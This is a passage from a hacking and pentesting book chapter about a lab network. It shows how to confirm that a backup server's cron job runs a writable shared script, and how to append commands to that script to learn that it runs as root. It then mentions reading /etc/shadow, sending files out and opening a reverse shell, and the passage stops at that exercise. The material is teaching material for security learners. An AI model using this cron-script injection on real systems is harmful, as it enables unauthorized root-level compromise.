# Security Chapter Extract
Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
Chapter: 02 - Verifying Exploitability
To verify whether c-backup-01 is in fact executing the execute.sh script, we need it to emit a signal. This signal could be a network packet sent to a listener we open; alternatively, we could force c-backup-01 to create a file in the shared drive. Let’s try this. On p-web-01 (172.16.10.10), add the following line to the end of /mnt/script/execute.sh:
touch "/mnt/scripts/$(hostname).txt"
Since the script claims to run every minute, we need to monitor the file-creation event so we can see it before the file is deleted. We can do so using the watch command. Listing 11-6 will run the ls -l command and refresh the output every two seconds.
$ watch -d 'ls -l'
Security Relevance Score: 4
Word Count: 498
Extracted: 2025-06-13 23:40:57

---

Verifying Exploitability
To verify whether c-backup-01 is in fact executing the execute.sh script, we need it to emit a signal. This signal could be a network packet sent to a listener we open; alternatively, we could force c-backup-01 to create a file in the shared drive. Let’s try this. On p-web-01 (172.16.10.10), add the following line to the end of /mnt/script/execute.sh:
touch "/mnt/scripts/$(hostname).txt"
Since the script claims to run every minute, we need to monitor the file-creation event so we can see it before the file is deleted. We can do so using the watch command. Listing 11-6 will run the ls -l command and refresh the output every two seconds.
$ watch -d 'ls -l'

Every 2.0s: ls -l     p-web-01.acme-infinity-servers.com: Sat

total 8
-rw-r--r-- 1 root root 0 Nov 4 18:13 c-backup-01.acme-infinity-servers.com.txt
-rwxr--r-- 1 root root 529 Nov 4 18:08 execute.sh

Listing 11-6: Using the watch command to monitor file changes
As you can see, the c-backup-01.acme-infinity-servers.com.txt file appears, indicating that c-backup-01 is in fact executing this script.


Checking the User Context
Cron jobs can be run by dedicated users, but in certain cases, they may run as the root user. This could happen out of convenience or may be a security oversight. To verify the user context with which the script is running, we can add commands to the file to capture the hostname, the identity of the user running the cron job, and the list of all the processes running on the system:
echo "Hostname: $(hostname)" > /mnt/scripts/$(hostname).txt
echo "Identity: $(id)" >> /mnt/scripts/$(hostname).txt
echo "Processes: $(ps aux)" >> /mnt/scripts/$(hostname).txt

Repeat the watch command from Listing 11-4 to see the new content written into the file. Once content is written, run cat to see the result:
$ cat /mnt/scripts/c-backup-01*

Hostname: c-backup-01.acme-infinity-servers.com
Identity: uid=0(root) gid=0(root) groups=0(root)
Processes:
USER     PID   %CPU %MEM  VSZ   RSS TTY  STAT START TIME COMMAND
--snip--
root     1812  0.0  0.0   2732   924 ?   Ss 18:23  0:00 /bin/sh -c bash /mnt/scripts/execute.sh
root     1813  0.0  0.0   4244  3196 ?   S  18:23  0:00 bash /mnt/scripts/execute.sh
root     1823  0.0  0.0   8204  4000 ?   R  18:23  0:00 ps aux

The script is running as root. This means we have full command execution ability under the root context. From here, we can do pretty much anything, such as viewing files owned by the root user, like /etc/shadow; writing custom files into key system directories; copying files to a remote server; and adding users.
Exercise 24: Gaining a Reverse Shell on the Backup Server
While the vulnerability in the cron job script discovered in the previous section gives us an unlimited ability to execute commands on c-backup-01 (10.1.0.13), we don’t yet have a shell on the server. Let’s get one.
No machine on the corporate network has internet access. You’ll have to find another way to transfer any additional tools you may need to complete a full compromise over the corporate network. How to establish the reverse shell is ultimately up to you, but here is high-level guidance you can follow:
